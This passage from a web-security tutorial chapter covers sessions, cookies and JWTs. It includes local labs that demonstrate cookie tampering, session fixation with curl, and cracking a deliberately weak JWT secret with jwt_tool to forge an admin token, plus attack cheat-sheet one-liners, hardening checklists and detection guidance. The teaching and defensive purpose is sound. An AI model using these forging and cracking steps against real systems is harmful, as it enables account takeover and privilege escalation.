Content-Type: text/html; charset=utf-8
Set-Cookie: session=eyJ1c2VyIjoiYWxpY2UifQ.aBc.9Xy...; HttpOnly; Path=/
logged in as alice
```

```bash
# Reuse the cookie -> we're recognized without re-authenticating
curl -s -b jar.txt http://localhost:5000/whoami
# -> you are alice
```

Now inspect the cookie. Flask's default session is a **signed, client-side** cookie (itself a
mini-token!). Decode the first dot-segment:

```bash
echo 'eyJ1c2VyIjoiYWxpY2UifQ' | base64 -d 2>/dev/null; echo
# -> {"user":"alice"}
```

Readable but **signed** with `app.secret_key`. Try to tamper — edit `alice`→`admin` in the
cookie and replay:

```bash
curl -s -b 'session=eyJ1c2VyIjoiYWRtaW4ifQ.forged.sig' http://localhost:5000/whoami
# -> you are nobody     (signature check fails; tamper rejected)
```

**Lesson:** the signature is doing the work. This is exactly why a *weak* signing key is fatal —
if `app.secret_key` were guessable, you'd forge `admin` at will (that's the `flask-unsign` tool's
entire job).

### 12.2 Demonstrate session fixation

Comment out `session.clear()` in `/login` (the insecure variant), restart, then:

```bash
# 1. Attacker obtains a pre-auth session value and plants it
curl -s -c jar.txt http://localhost:5000/whoami >/dev/null
PLANTED=$(grep session jar.txt | awk '{print $NF}')

# 2. Victim logs in *with the planted cookie*
curl -s -b "session=$PLANTED" -X POST http://localhost:5000/login \
     -d 'user=alice&pass=hunter2'

# 3. Attacker replays the SAME planted cookie -> rides Alice's session
curl -s -b "session=$PLANTED" http://localhost:5000/whoami
# -> you are alice   (VULNERABLE: id was not rotated at login)
```

Re-enable `session.clear()`, and step 3 returns `nobody` — the fix in one line.

### 12.3 Build and attack a JWT API

```python
# jwtapi.py
from flask import Flask, request, jsonify
import jwt   # pip install pyjwt

app = Flask(__name__)
SECRET = "secret"          # DELIBERATELY WEAK for the lab

@app.route("/token")
def token():
    t = jwt.encode({"sub": "alice", "role": "user"}, SECRET, algorithm="HS256")
    return jsonify(token=t)

@app.route("/admin")
def admin():
    auth = request.headers.get("Authorization", "").removeprefix("Bearer ")
    try:
        data = jwt.decode(auth, SECRET, algorithms=["HS256"])
    except Exception as e:
        return jsonify(error=str(e)), 401
    if data.get("role") != "admin":
        return jsonify(msg="forbidden"), 403
    return jsonify(msg="welcome admin")

app.run(port=5001)
```

```bash
pip install pyjwt flask
python3 jwtapi.py &
TOK=$(curl -s http://localhost:5001/token | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
echo "$TOK"
```

**Attack 1 — brute-force the weak HMAC secret offline:**

```bash
python3 jwt_tool.py "$TOK" -C -d /usr/share/wordlists/rockyou.txt
# [+] secret found: "secret"
```

**Attack 2 — forge an admin token with the cracked secret and escalate:**

```bash
FORGED=$(python3 jwt_tool.py "$TOK" -S hs256 -p "secret" \
         -T 2>/dev/null | grep -oE 'eyJ[A-Za-z0-9._-]+')   # tamper role->admin, re-sign
curl -s http://localhost:5001/admin -H "Authorization: Bearer $FORGED"
# -> {"msg":"welcome admin"}     ACCOUNT/PRIV ESCALATION
```

**Attack 3 — the `alg:none` playbook (against a naive verifier):** run
`python3 jwt_tool.py "$TOK" -X a` and feed the produced `none`-alg token to `/admin`. Against
our PyJWT verifier with an explicit `algorithms=["HS256"]` allowlist it is *rejected* — which is
the whole point: **the fix for `alg:none` is the allowlist you just saw stop it.** Remove the
allowlist and watch it succeed — proving the vulnerability is the missing allowlist, not the
token.

You have now, from scratch: issued sessions, stolen and replayed one, fixed a session, decoded
and tampered a signed cookie, and cracked-and-forged a JWT. That is the entire attack surface of
this chapter, exercised end to end.

---

## Part 13: OAuth, SSO and Refresh Tokens — Where This Leads

You will rarely mint tokens by hand in production; you'll receive them from an **identity
provider** via OAuth 2.0 / OpenID Connect. A quick orientation so the vocabulary isn't foreign
when the dedicated chapters arrive:

- **OAuth 2.0** is a *delegated authorization* framework: "let this app access this resource on
  my behalf" (e.g. "let Foo read my Google contacts"). The app receives an **access token** (a
  bearer token, frequently a JWT) it presents to the resource server.
- **OpenID Connect (OIDC)** layers *authentication* on top of OAuth: it adds an **ID token** (a
  JWT describing *who logged in*) so apps can use "Sign in with Google/Apple/etc." for login,
  not just resource access.
- **Access token vs refresh token.** The access token is short-lived and sent on every API call.
  The **refresh token** is long-lived, kept secret (ideally in an `HttpOnly` cookie or secure
  storage), and exchanged at the token endpoint for fresh access tokens without re-prompting the
  user. Refresh tokens are the revocation lever for stateless access tokens (Part 11).

```mermaid
sequenceDiagram
    participant U as User
    participant App as App (client)
    participant IdP as Identity Provider
    participant API as Resource Server
    U->>App: click "Sign in with X"
    App->>IdP: redirect (authorization request)
    U->>IdP: authenticate + consent
    IdP-->>App: authorization code (redirect)
    App->>IdP: exchange code (+ client secret) for tokens
    IdP-->>App: access_token (short) + refresh_token (long) + id_token
    App->>API: request + Authorization: Bearer access_token
    API-->>App: protected resource
    App->>IdP: refresh_token -> new access_token (when expired)
```

The bug classes here (redirect_uri manipulation, `state`-parameter CSRF, token leakage via
`Referer`, PKCE downgrade, implicit-flow token exposure) build directly on the cookie, token,
CSRF, and redirect material from this chapter and Chapter 2 — which is why this ordering exists.
The dedicated OAuth chapter goes deep; here it's enough to see that "sessions and tokens" is the
substrate the whole SSO world stands on.

---

## Part 14: Detection & Defense Angle — Hardening and Monitoring Session Security

Pulling every defensive thread into one consolidated place, as the reference chapters do.

**Cookie & session hardening checklist (the non-negotiables):**

- Session cookies: `HttpOnly`, `Secure`, `SameSite=Lax` (or `Strict` where UX allows),
  `__Host-` prefix, host-only (no broad `Domain`), sensible `Max-Age`.
- Session IDs: ≥128 bits of CSPRNG entropy; never in URLs; **regenerate on login and on any
  privilege change**.
- Absolute + idle timeouts: expire sessions both after a fixed lifetime and after inactivity.
- Server-side invalidation on logout, password change, and suspicious activity; offer
  "log out of all sessions."
- CSRF: `SameSite` **plus** synchronizer tokens on every state-changing route; verify
  `Origin`/`Referer` on sensitive actions.

**JWT hardening checklist:**

- Enforce an **algorithm allowlist** in the verifier; never trust the token's `alg`. Reject
  `none`.
- Strong keys: ≥256-bit random HMAC secret, or asymmetric RS256/ES256 with proper key
  management. Rotate keys; use `kid` to select from a trusted keyset (allowlist the source).
- Always validate `exp`, `nbf`, `iss`, `aud`. Reject tokens for the wrong audience/issuer.
- Short access-token lifetimes; revocable refresh tokens; a `jti` denylist for emergency
  revocation.
- Never store secrets/PII in a JWS payload. Prefer `HttpOnly`-cookie storage over `localStorage`
  in browsers.

**What detection looks like (blue team / IR):**

```mermaid
flowchart LR
    A[Auth & session logs] --> B{Anomaly?}
    B -->|Same SID, 2 distant IPs| C[Possible hijack]
    B -->|SID unchanged across login| D[Fixation-prone app]
    B -->|POST w/ cross-site Origin + valid SID| E[CSRF attempt]
    B -->|alg=none / unexpected alg seen| F[JWT tampering attempt]
    C --> G[Revoke session, alert]
    E --> G
    F --> G
```

- **Impossible-travel / concurrent-use detection:** the same session ID or token used from two
  geographically distant IPs within minutes is a strong hijack signal. Alert and optionally force
  re-auth.
- **Session-anomaly monitoring:** sudden `User-Agent` changes on a live session, privilege use
  that doesn't match the session's role claim, or a spike in 401/403 from token tampering.
- **JWT tamper telemetry:** log signature-verification failures and any request presenting
  `alg:none` or an unexpected algorithm — those are not accidents, they're probes.
- **Token/secret exposure hunting:** grep your logs, `Referer` headers, and error pages for
  anything resembling a JWT (`eyJ...`) or session ID; tokens in URLs or logs are an incident.

The defensive posture is layered: make the artifact unstealable (`HttpOnly`, `Secure`),
unforgeable (CSPRNG SIDs, strong signatures, alg allowlists), short-lived (timeouts, short
`exp`), and revocable (server sessions or refresh-token rotation) — and then watch for the
telemetry that says someone tried anyway.

---

## Part 15: Final Revision / Summary

The through-line of this chapter, compressed:

- **HTTP is stateless**, so identity must be re-proven on every request via *some artifact*
  traveling with the request. Protecting that artifact is the whole game.
- **Server-side sessions** store state on the server and hand the client an **opaque session
  ID**. A SID is a *pointer*; its security rests on being long, high-entropy, CSPRNG-generated,
  and unguessable. Sessions are **revocable instantly** but need a shared store to scale.
- **Cookies** transport the SID. `Set-Cookie` carries the value + attributes; the `Cookie`
  header carries only name=value. The security attributes — **`HttpOnly`** (anti-XSS-theft),
  **`Secure`** (anti-sniff), **`SameSite`** (anti-CSRF), `Domain`/`Path` (scope), `__Host-`
  prefix — each map to a specific bug class.
- **Session attacks:** hijacking (steal a live SID), fixation (plant a SID before login → fix by
  **regenerating the ID at login**), and never putting SIDs in URLs.
- **CSRF** exploits cookies' automatic cross-site sending. Defend with `SameSite` + anti-CSRF
  tokens + origin checks. Token-in-header auth is inherently CSRF-immune.
- **Tokens / JWTs** are self-contained, signed identity (`header.payload.signature`). A token is
  the *data*; the server verifies a **signature** instead of doing a lookup — enabling stateless
  scale. But the payload is readable (never store secrets in it) and the token is valid until
  `exp`.
- **JWT attacks:** `alg:none` (fix: algorithm allowlist), RS256→HS256 confusion (fix: pin the
  algorithm), weak-HMAC brute force (fix: strong random secret / asymmetric keys), plus `exp`
  neglect, `kid`/`jku` injection, missing `aud` checks.
- **Stateful vs stateless** is really *where session truth lives*. Stateful → instant revocation,
  needs a store. Stateless → trivial scaling, hard revocation (the logout problem), solved
  pragmatically with short access tokens + revocable refresh tokens (a hybrid).
- **Storage matters:** `HttpOnly` cookie (safe from XSS, needs CSRF defense) vs `localStorage`
  (CSRF-immune, exposed to XSS). Pick your poison deliberately.

If you can read a raw `Set-Cookie`, explain every attribute, decode a JWT by hand, and name the
fix for `alg:none` without looking it up, you own this chapter.

---

## Part 16: Cheat Sheet / Quick Reference

**Ideal session cookie**

```http
Set-Cookie: __Host-SID=<128-bit CSPRNG hex>; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
```

**Cookie attribute → defends against**

| Attribute | Defends against |
|---|---|
| `HttpOnly` | Cookie theft via XSS (`document.cookie`) |
| `Secure` | Cleartext sniffing / SSL-strip |
| `SameSite=Lax/Strict` | CSRF (cross-site auto-send) |
| `__Host-` prefix | Subdomain cookie injection/fixation |
| host-only `Domain` | Leakage to untrusted subdomains |

**Generate a strong SID**

```python
import secrets; sid = secrets.token_hex(16)   # 128 bits
```
```javascript
const sid = require('crypto').randomBytes(16).toString('hex');
```

**Decode a JWT (no key)**

```bash
echo '<payload-segment>' | base64 -d 2>/dev/null   # Base64URL: tr '_-' '/+' first if needed
```

**JWT attack quicklist**

| Attack | One-liner idea | Fix |
|---|---|---|
| `alg:none` | set `alg:none`, empty sig | algorithm allowlist |
| RS256→HS256 | HMAC-sign with the public key | pin algorithm |
| Weak secret | `hashcat -m 16500` / `jwt_tool -C` | ≥256-bit random secret |
| No `exp` check | replay old token | validate `exp`/`nbf`/`aud` |

**Session fixation test:** cookie value before login == after login? → vulnerable.

**jwt_tool essentials**

```bash
python3 jwt_tool.py <token>                  # decode
python3 jwt_tool.py <token> -X a             # alg:none
python3 jwt_tool.py <token> -C -d words.txt  # crack HMAC secret
python3 jwt_tool.py -t <url> -rh "Authorization: Bearer <t>" -M pb   # playbook
```

**Stateful vs stateless one-liner:** *session ID = pointer (revocable, needs store); token =
data (scales, hard to revoke).*

---

## Part 17: Common Pitfalls

- **Not regenerating the session ID at login.** The single most common session bug → fixation.
  Rotate on every privilege change, always.
- **Session ID in a URL.** Leaks via `Referer`, logs, history. SIDs go in cookies (or auth
  headers), never the address bar.
- **Trusting the JWT's `alg` field.** `alg:none` and RS256→HS256 confusion both flow from a
  verifier that lets the token pick the algorithm. Always allowlist server-side.
- **Weak HMAC secret.** `secret`, `changeme`, framework defaults → offline brute force → total
  forgery. Use a long random secret or asymmetric keys.
- **Forgetting to check `exp`.** A token with no expiry validation is a permanent credential; a
  stolen one never dies.
- **Broad cookie `Domain`.** Scoping the session cookie to the parent domain shares it with every
  subdomain, including forgotten/weak ones. Prefer host-only + `__Host-`.
- **Assuming `SameSite=Lax` kills all CSRF.** It doesn't cover state-changing **GET** endpoints,
  and some infra strips it. Keep anti-CSRF tokens too.
- **JWT in `localStorage`.** Convenient, but any XSS exfiltrates the token. Prefer `HttpOnly`
  cookies for the sensitive credential.
- **Putting secrets/PII in a JWT payload.** A JWS is signed, not encrypted — the client reads
  everything. Use JWE or keep secrets server-side.
- **Believing statelessness gives you free logout.** It doesn't. Plan revocation (short `exp` +
  refresh-token rotation or a `jti` denylist) from day one.
- **No idle/absolute timeout.** Sessions that never expire turn any single theft into indefinite
  access.

---

## Part 18: Practice Labs & Resources

Train each concept from this chapter on a purpose-built, legal target:

- **PortSwigger Web Security Academy** (free, the gold standard):
  - *Authentication* labs — brute-forcing, weak session handling, and logic flaws.
  - *JWT attacks* — the full set: unverified signature, `alg:none`, weak signing key
    (brute-force), RS256→HS256 algorithm confusion, `jwk`/`jku`/`kid` header injection. Do all
    of these with `jwt_tool` and the built-in **JWT Editor** Burp extension.
  - *CSRF* — token-missing, token-not-tied-to-session, `SameSite` bypass, and method-override
    labs.
  - *OAuth 2.0* — for the Part 13 follow-on (linking, `redirect_uri`, `state` CSRF).
- **OWASP Juice Shop** — hunt real session/JWT/cookie bugs end to end (it uses JWTs; several
  challenges are pure token attacks).
- **TryHackMe** — *JWT Security*, *Session Management*, and the *OWASP Top 10* (Broken
  Authentication / Identification & Authentication Failures) rooms.
- **HackTheBox** — web challenges and easy boxes that hinge on cookie tampering and JWT forgery.
- **picoCTF** — the web-exploitation category regularly features cookie-tampering and JWT
  challenges, good for first exposure.
- **Tooling to learn alongside:** `jwt_tool` and `hashcat -m 16500` (JWT cracking), Burp
  **Sequencer** (session-token entropy analysis), Burp **JWT Editor** extension, `flask-unsign`
  (Flask signed-cookie forgery), and `curl -c/-b` cookie jars for scripted session drills.

**Practice questions / mini-labs to self-test:**

1. You capture a cookie `auth=YWRtaW46MTcwMDAwMDAwMA==`. Decode it, explain why it's insecure,
   and describe the exact request that gives you another user's account. What single server
   change fixes it?
2. Given a login flow, write the precise procedure (with `curl`) to prove the app is vulnerable
   to **session fixation**, and state the one-line server fix.
3. You hold an `HS256` JWT signed with an unknown secret. Walk through recovering the secret and
   forging an `admin` token, naming the exact tools and modes.
4. Explain why a JWT carried in an `Authorization: Bearer` header is immune to classic CSRF but a
   session cookie is not — and what new risk the bearer-token approach introduces instead.
5. Design the auth for a bank web app that needs both trivial horizontal scaling *and* instant
   "log out everywhere." Which model do you choose, and exactly how do you get both properties?
